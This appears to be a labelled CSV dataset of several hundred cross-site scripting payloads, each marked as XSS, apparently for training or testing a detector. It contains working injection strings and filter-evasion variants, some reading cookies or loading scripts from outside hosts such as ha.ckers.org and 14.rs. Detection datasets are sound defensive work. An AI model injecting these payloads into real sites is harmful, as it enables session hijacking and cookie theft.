payload,xss
"<multicol oncontextmenu=""alert(1)"">AnonKryptiQuz</multicol>",1
<header onbeforescriptexecute=alert(1)><script>1</script>,1
"<ruby onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",1
<strong onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</strong>,1
"<tt onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",1
"<isindex onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",1
"<small onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</small>",1
<font style='color:expression(alert(1))'>,1
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,1
"<tfoot onclick=""alert(1)"">AnonKryptiQuz</tfoot>",1
<content onafterscriptexecute=alert(1)><script>1</script>,1
foo\'; alert(document.cookie);//';,1
<svg><noscript onload=alert(1)></noscript>,1
"<code onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</code>",1
"<embed id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></embed>",1
"<audio onmouseout=""alert(1)"">AnonKryptiQuz</audio>",1
"<time onmouseleave=""alert(1)"">AnonKryptiQuz</time>",1
"<rtc oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<style>:target {transform: rotate(180deg);}</style><script id=x style=""transition:transform 2s"" ontransitionrun=print()></script>",1
"<aside onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</aside>",1
"<plaintext oncontextmenu=""alert(1)"">AnonKryptiQuz</plaintext>",1
"<button onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</button>",1
"<template onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</template>",1
<svg onpointerout=alert(1) style=display:block>AnonKryptiQuz</svg>,1
"<img src=""x"" onerror=""alert(1)"">",1
"<h1 onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</h1>",1
"<style>:target {color:red;}</style><input4 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></input4>",1
"<tbody onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",1
"<li onmousedown=""alert(1)"">AnonKryptiQuz</li>",1
--><script>alert(123)</script>,1
"<center onmouseleave=""alert(1)"">AnonKryptiQuz</center>",1
"<center onmouseout=""alert(1)"">AnonKryptiQuz</center>",1
<p onpointermove=alert(1) style=display:block>AnonKryptiQuz</p>,1
"<h1 oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></fieldset>",1
"<mark draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",1
"<legend onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",1
<xmp onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</xmp><input value=clickme>,1
"<noscript onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</noscript>",1
"<article onmouseleave=""alert(1)"">AnonKryptiQuz</article>",1
"<animatemotion onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",1
<xss onafterscriptexecute=alert(1)><script>1</script>,1
"<div draggable=""true"" contenteditable>drag me</div><input4 ondragover=alert(1) contenteditable style=display:block>drop here</input4>",1
<title contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<track id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></track>",1
"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1
<body oninput=javascript:alert(/AmoloHT/)><input autofocus>,1
<ins onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</ins>,1
"<th onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</th>",1
"prototype.join=function(){confirm(""PWND:""+document.body.innerHTML)}')();",1
<script%00>alert(1)</script%00>,1
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;AnonKryptiQuz&lt;/A&gt;",1
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<caption onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</caption>",1
"<picture onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",1
%252F%252F%252A%253E%253CScRipt%253Ealert%2528%252FAnonKryptiQuz%252F%2529%253C%252FScriPT%253E,1
<cite onpointerup=alert(1) style=display:block>AnonKryptiQuz</cite>,1
"<xmp onmousedown=""alert(1)"">AnonKryptiQuz</xmp>",1
%22-confirm(1)-%22,1
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",1
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",1
"<dl onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",1
{{''.constructor.constructor('alert(1)')()}},1
"<input type=""text"" value=""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e""></input>",1
<figure onpointerenter=alert(1) style=display:block>AnonKryptiQuz</figure>,1
"<bgsound oncut=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a2 id=x style=""position:absolute;"" onanimationcancel=""print()""></a2>",1
"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></li>",1
<h1 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</h1>,1
<big contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<;A HREF="";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"";>;XSS<;/A>;",1
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationstart=""alert(1)""></figcaption>",1
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=print()></a>",1
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>,1
"<h1 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></link>",1
<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>,1
<object onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</object><input value=clickme>,1
<button popovertarget=x>Click me</button><header ontoggle=alert(1) popover id=x>AnonKryptiQuz</header>,1
"<mark onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</mark>",1
"<input type=""hidden"" value=""mypayload"" /> %22%20autofocus%20onfocus%3d(confirm)(1)%2f%2f",1
<div onpointermove=alert(1) style=display:block>AnonKryptiQuz</div>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""print()""></dl>",1
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable style=display:block>drop here</ruby>",1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationstart=""alert(1)""></acronym>",1
<svg><element onload=alert(1)></element>,1
"<dfn onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",1
"""<prompt(9)<""",1
"<listing onclick=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",1
<image onpointerup=alert(1) style=display:block>AnonKryptiQuz</image>,1
"<div onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</div>",1
onmouseover=”alert(‘AnonKryptiQuz’),1
&amp;amp;amp;lt;img/src/onerror=alert(`AnonKryptiQuz`)&amp;amp;amp;gt;,1
"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=print()></source>",1
<spacer onmousewheel=alert(1) style=display:block>requires scrolling,1
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",1
&#X003C,1
<big onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</big><input value=clickme>,1
"<style>@keyframes slidein {}</style><noscript style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noscript>",1
"<sub onmouseout=""alert(1)"">AnonKryptiQuz</sub>",1
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></footer>",1
<audio onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</audio><input value=clickme>,1
"<summary onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</summary>",1
&#X03c;,1
<element onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</element><input value=clickme>,1
"<audio onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",1
<button popovertarget=x>Click me</button><link ontoggle=alert(1) popover id=x>AnonKryptiQuz</link>,1
"<![><img src=""]><img src=x onerror=alert(AnonKryptiQuz)//"">",1
"<figure onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",1
<marquee id=x tabindex=1 onactivate=alert(1)></marquee>,1
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""print()""></canvas>",1
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",1
<input3 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</input3><input value=clickme>,1
"<img onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></img>",1
"<tt onmouseover=""alert(1)"">AnonKryptiQuz</tt>",1
<input2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</input2>,1
"&lt;IFRAME SRC=\""javascript&#058;alert('AnonKryptiQuz');\""&gt;&lt;/IFRAME&gt;",1
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=print()></content>",1
"<details draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</details>",1
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style=""position:absolute;"" onanimationcancel=""print()""></template>",1
"<image2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></image2>",1
<video src/onerror=alert(1)>,1
"<track draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</track>",1
"<hr onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",1
"<optgroup draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</optgroup>",1
"""><img src=a onerror=alert(document.location)>",1
"<abbr ondblclick=""alert(1)"">AnonKryptiQuz</abbr>",1
"<style>@keyframes x{}</style><iframe2 style=""animation-name:x"" onanimationstart=""alert(1)""></iframe2>",1
"<a href=""about:<script>document.vulnerable=true;</script>"">",1
"<style>:target {color:red;}</style><element id=x style=""transition:color 1s"" ontransitionstart=alert(1)></element>",1
<source onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</source><input value=clickme>,1
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,1
"<nextid ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</nextid>",1
"- xss""></a><input value=""Type anything""onbeforeinput=""prompt%26lpar%3Bdocument.domain%26rpar%3B""><!--",1
"</pre><!-%00-><svg/%0D%0A%0D%0A/Id=""a""/TABindex=""1""/onload=""\u0061lert(1);"">",1
<img[%0a]onerror=alert(1) src=a>,1
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,1
<a onpointerleave=alert(1) style=display:block>AnonKryptiQuz</a>,1
"<img src=x onerror=\x00""javascript:alert(1)"">",1
"<noframes draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</noframes>",1
�scriptualert(EAnonKryptiQuzE)�/scriptu,1
<strike id=x tabindex=1 onfocus=alert(1)></strike>,1
"<img SRC=""javascript:document.vulnerable=true;""",1
"<time draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</time>",1
"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",1
＜script＞alert(123)＜/script＞,1
"<legend onmousedown=""alert(1)"">AnonKryptiQuz</legend>",1
"<tbody draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</tbody>",1
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",1
<col onpointerout=alert(1) style=display:block>AnonKryptiQuz</col>,1
<svg><bdi onload=alert(1)></bdi>,1
"<=script>=alert(""AnonKryptiQuz"")<=/scirpt>=",1
<img onpointermove=alert(1) style=display:block>AnonKryptiQuz</img>,1
<!--><scRipT src=//14.rs>,1
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onwebkitanimationend=""alert(1)""></shadow>",1
<base href=//0>,1
<iframe/onload=alert(0);>,1
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",1
<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,1
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,1
<wbr onpointerout=alert(1) style=display:block>AnonKryptiQuz</wbr>,1
"<code onmousemove=""alert(1)"">AnonKryptiQuz</code>",1
<textarea oncut=alert(1) autofocus>AnonKryptiQuz</textarea>,1
"<del draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</del>",1
"<menu onmouseover=""alert(1)"">AnonKryptiQuz</menu>",1
"`'"";//><img/src=x onError=""${x};alert(`AnonKryptiQuz`);"">",1
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",1
"<input3 onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</input3>",1
"<noframes onmouseout=""alert(1)"">AnonKryptiQuz</noframes>",1
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable style=display:block>drop here</colgroup>",1
"<style>:target {color:red;}</style><aside id=x style=""transition:color 1s"" ontransitionend=alert(1)></aside>",1
<a href=javas%26#99;ript:prompt%26#x28document.domain)>xss,1
"""><img src=x onerror=prompt(unescape('document%2Edomain'));>",1
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" ontransitionend=alert(1)></listing>",1
"<command draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</command>",1
"<object draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</object>",1
"<a2 oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",1
"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",1
"<rp onmouseup=""alert(1)"">AnonKryptiQuz</rp>",1
<iframe onreadystatechange=alert(1)></iframe>,1
"<span onmouseup=""alert(1)"">AnonKryptiQuz</span>",1
<noembed onpointermove=alert(1) style=display:block>AnonKryptiQuz</noembed>,1
"<u oncut=""alert(1)"" contenteditable>AnonKryptiQuz</u>",1
<hr onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</hr><input value=clickme>,1
"<map onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</map>",1
<small id=x tabindex=1 onfocusin=alert(1)></small>,1
"<base onmouseleave=""alert(1)"">AnonKryptiQuz</base>",1
"<keygen ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</keygen>",1
"<nextid oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",1
"<br oncontextmenu=""alert(1)"">AnonKryptiQuz</br>",1
"<isindex draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</isindex>",1
"<tr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",1
"<spacer oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
&#X0003c,1
<data onpointerleave=alert(1) style=display:block>AnonKryptiQuz</data>,1
"<animate oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</animate>",1
"<style>:target {transform: rotate(180deg);}</style><noembed id=x style=""transition:transform 2s"" ontransitionrun=print()></noembed>",1
"<li onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</li>",1
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></em>",1
"<comment><img src=""</comment><img src=x onerror=javascript:alert(/AmoloHT/))//"">",1
"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",1
"<iframe onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</iframe>",1
"<BASE HREF=""javascript:alert('AnonKryptiQuz');//"">",1
<aside onpointerdown=alert(1) style=display:block>AnonKryptiQuz</aside>,1
<input onblur=javascript:alert(1) autofocus><input autofocus>,1
"<sub oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",1
"<p onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</p>",1
"<script onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</script>",1
"<th draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</th>",1
"<form id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></form>",1
"<section oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</section>",1
"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"""><<script>alert(document.cookie);//<</script>",1
<label contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<dir onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",1
"<div draggable=""true"" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable style=display:block>drop here</caption>",1
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",1
"<footer onmouseleave=""alert(1)"">AnonKryptiQuz</footer>",1
